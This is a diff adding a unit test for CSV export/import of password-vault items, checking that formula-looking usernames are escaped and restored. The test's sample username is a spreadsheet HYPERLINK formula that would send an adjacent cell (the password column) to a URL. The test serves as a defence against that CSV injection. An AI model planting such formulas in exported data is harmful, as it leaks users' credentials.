@@ -30,3 +30,20 @@ test("csv: Bitwarden export and import round-trip logins and notes", () => {
   assert.equal(note.notes, "line1\nline2");
   assert.throws(() => csvToExport("a,b\n1,2"));
 });
+
+test("csv: a formula-looking username is defused on export and restored on import; other cells stay as typed", () => {
+  const evil = '=HYPERLINK("http://127.0.0.1:9/?"&J3,"x")';
+  const items = [{ type: 1, name: "a.test", notes: "- milk", login: { username: evil, password: "=p@ss", totp: "", uris: [] } }];
+  const { csv } = itemsToCsv(items, () => "");
+  const row = parseCsv(csv)[1]!;
+  assert.equal(row[8], `'${evil}`);
+  assert.equal(row[4], "- milk");
+  assert.equal(row[9], "=p@ss");
+  const [login] = csvToExport(csv).items as Record<string, any>[];
+  assert.equal(login.login.username, evil);
+  assert.equal(login.notes, "- milk");
+  assert.equal(login.login.password, "=p@ss");
+  // A username that already starts with ' and a formula character survives the round trip.
+  const [kept] = csvToExport(itemsToCsv([{ type: 1, name: "b", login: { username: "'=x" } }], () => "").csv).items as Record<string, any>[];
+  assert.equal(kept.login.username, "'=x");
+});
